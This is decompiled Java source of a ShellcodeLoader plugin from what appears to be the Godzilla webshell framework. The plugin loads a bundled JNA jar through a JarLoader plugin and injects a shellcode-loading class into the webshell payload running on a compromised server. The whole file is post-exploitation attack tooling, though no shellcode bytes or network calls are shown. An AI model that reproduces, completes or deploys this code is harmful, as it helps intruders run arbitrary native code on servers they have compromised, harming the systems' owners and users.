/*    */ package shells.plugins.java;
/*    */ 
/*    */ import core.annotation.PluginAnnotation;
/*    */ import core.ui.ShellManage;
/*    */ import core.ui.component.dialog.GOptionPane;
/*    */ import java.awt.Component;
/*    */ import java.io.InputStream;
/*    */ import shells.plugins.generic.ShellcodeLoader;
/*    */ import util.Log;
/*    */ import util.functions;
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ @PluginAnnotation(payloadName = "JavaDynamicPayload", Name = "ShellcodeLoader", DisplayName = "ShellcodeLoader")
/*    */ public class ShellcodeLoader
/*    */   extends ShellcodeLoader
/*    */ {
/*    */   private static final String CLASS_NAME = "plugin.ShellcodeLoader";
/*    */   private JarLoader jarLoader;
/*    */   
/*    */   private boolean loadJar(byte[] jar) {
/* 43 */     if (this.jarLoader == null) {
/*    */       try {
/* 45 */         if (this.jarLoader == null) {
/* 46 */           ShellManage shellManage = this.shellEntity.getFrame();
/* 47 */           this.jarLoader = (JarLoader)shellManage.getPlugin("JarLoader");
/*    */         } 
/* 49 */       } catch (Exception e) {
/* 50 */         GOptionPane.showMessageDialog((Component)this.shellEntity.getFrame(), "no find plugin JarLoader!");
/* 51 */         return false;
/*    */       } 
/*    */     }
/* 54 */     return this.jarLoader.loadJar(jar);
/*    */   }
/*    */ 
/*    */ 
/*    */ 
/*    */   
/*    */   public boolean load() {
/* 61 */     if (!this.loadState) {
/*    */       try {
/* 63 */         InputStream inputStream = getClass().getResourceAsStream("assets/ShellcodeLoader.classs");
/* 64 */         byte[] data = functions.readInputStream(inputStream);
/* 65 */         inputStream.close();
/* 66 */         inputStream = getClass().getResourceAsStream("assets/GodzillaJna.jar");
/* 67 */         byte[] jar = functions.readInputStream(inputStream);
/* 68 */         inputStream.close();
/* 69 */         if (loadJar(jar)) {
/* 70 */           Log.log(String.format("LoadJar : %s", new Object[] { Boolean.valueOf(true) }), new Object[0]);
/* 71 */           this.loadState = this.payload.include("plugin.ShellcodeLoader", data);
/*    */         } 
/* 73 */       } catch (Exception e) {
/* 74 */         Log.error(e);
/* 75 */         GOptionPane.showMessageDialog(this.panel, e.getMessage(), "提示", 2);
/*    */       } 
/*    */     }
/*    */     
/* 79 */     return this.loadState;
/*    */   }
/*    */ 
/*    */   
/*    */   public String getClassName() {
/* 84 */     return "plugin.ShellcodeLoader";
/*    */   }
/*    */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\shells\plugins\java\ShellcodeLoader.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */